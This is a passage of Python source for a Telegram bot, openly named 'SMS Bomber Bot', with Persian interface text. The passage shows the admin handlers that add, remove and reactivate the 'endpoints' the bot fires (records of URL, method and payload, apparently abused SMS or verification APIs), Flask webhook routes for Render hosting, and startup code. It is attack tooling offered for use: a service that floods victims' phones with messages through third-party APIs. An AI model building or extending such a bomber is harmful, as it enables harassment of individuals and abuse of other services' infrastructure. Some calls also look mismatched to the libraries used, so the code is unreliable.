    await state.set_state(AdminState.waiting_for_endpoint_data)
    await callback.answer()

@dp.message(AdminState.waiting_for_endpoint_data)
async def handle_add_endpoint(message: Message, state: FSMContext):
    admin_id = message.from_user.id
    if not await AdminPanel.is_admin(admin_id):
        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
        await state.clear()
        return
    
    try:
        endpoint = json.loads(message.text)
    except json.JSONDecodeError:
        await message.reply_text("❌ فرمت JSON نامعتبر!\nلطفاً دوباره تلاش کنید یا /cancel را بزنید.")
        return
    
    required_fields = ['name', 'url', 'method', 'payload']
    for field in required_fields:
        if field not in endpoint:
            await message.reply_text(f"❌ فیلد '{field}' الزامی است!")
            return
    
    if endpoint_manager.add_endpoint(endpoint):
        await message.reply_text(f"✅ اندپوینت **{endpoint['name']}** با موفقیت اضافه شد!")
    else:
        await message.reply_text(f"❌ اندپوینت **{endpoint['name']}** قبلاً وجود دارد!")
    
    await state.clear()

@dp.callback_query(F.data == "admin_remove_endpoint")
async def admin_remove_endpoint_prompt(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    endpoints = endpoint_manager.get_all_endpoints()
    endpoint_list = "\n".join([f"• {e.get('name')}" for e in endpoints[:15]])
    
    await callback.message.edit_text(
        f"❌ **حذف اندپوینت**\n\nنام اندپوینت را وارد کنید:\n\nلیست اندپوینت‌ها:\n{endpoint_list}\n\nبرای لغو /cancel"
    )
    await state.set_state(AdminState.waiting_for_endpoint_name)
    await callback.answer()

@dp.message(AdminState.waiting_for_endpoint_name)
async def handle_remove_endpoint(message: Message, state: FSMContext):
    admin_id = message.from_user.id
    if not await AdminPanel.is_admin(admin_id):
        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
        await state.clear()
        return
    
    endpoint_name = message.text.strip()
    
    if endpoint_manager.remove_endpoint(endpoint_name):
        await message.reply_text(f"✅ اندپوینت **{endpoint_name}** با موفقیت حذف شد!")
    else:
        await message.reply_text(f"❌ اندپوینت **{endpoint_name}** یافت نشد!")
    
    await state.clear()

@dp.callback_query(F.data == "admin_reactivate_endpoints")
async def admin_reactivate_endpoints(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not await AdminPanel.is_admin(user_id):
        await callback.answer("❌ شما دسترسی ادمین ندارید!")
        return
    
    for e in endpoint_manager.get_all_endpoints():
        e['active'] = True
        e.pop('disabled_reason', None)
        e.pop('disabled_at', None)
    
    endpoint_manager.save_endpoints()
    await callback.answer("✅ همه اندپوینت‌ها فعال شدند!")
    await admin_endpoints(callback)

# ============================================================
# Flask Routes (برای Render)
# ============================================================

@app.route('/')
def home():
    return "✅ SMS Bomber Bot is running!"

@app.route('/health')
def health():
    return "OK", 200

@app.route('/webhook', methods=['POST'])
async def webhook():
    """دریافت درخواست‌های تلگرام از طریق Webhook"""
    try:
        update = Update(**request.json)
        await dp.feed_update(bot, update)
        return jsonify({"ok": True})
    except Exception as e:
        print(f"❌ خطا در Webhook: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500

# ============================================================
# تنظیم Webhook
# ============================================================

async def set_webhook():
    """تنظیم Webhook برای Render"""
    webhook_url = os.environ.get("WEBHOOK_URL")
    if not webhook_url:
        app_name = os.environ.get("RENDER_SERVICE_NAME", "sms-bomber-bot")
        webhook_url = f"https://{app_name}.onrender.com/webhook"
    
    try:
        await bot.set_webhook(
            url=webhook_url,
            allowed_updates=Update.ALL_TYPES
        )
        print(f"✅ Webhook تنظیم شد: {webhook_url}")
    except Exception as e:
        print(f"❌ خطا در تنظیم Webhook: {e}")

# ============================================================
# اجرا
# ============================================================

async def main():
    """اجرای اصلی ربات"""
    print("""
╔══════════════════════════════════════════════╗
║     SMS BOMBER BOT - نسخه کامل              ║
║     با سیستم سطوح کاربری + اعتبار          ║
╚══════════════════════════════════════════════╝
    """)
    print("🚀 ربات در حال راه‌اندازی...")
    print(f"📊 تعداد اندپوینت‌ها: {endpoint_manager.get_endpoints_count()}")
    print(f"✅ اندپوینت‌های فعال: {endpoint_manager.get_active_count()}")
    print(f"👑 ادمین‌ها: {ADMIN_IDS}")
    
    if os.environ.get("RENDER"):
        print("🔄 اجرا روی Render با Webhook...")
        await set_webhook()
        port = int(os.environ.get("PORT", 8080))
        app.run(host='0.0.0.0', port=port)
    else:
        print("🔄 اجرا روی Local با Polling...")
        print("✅ ربات آماده اجرا است!")
        await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("👋 ربات متوقف شد!")
    except Exception as e:
        print(f"❌ خطا: {e}")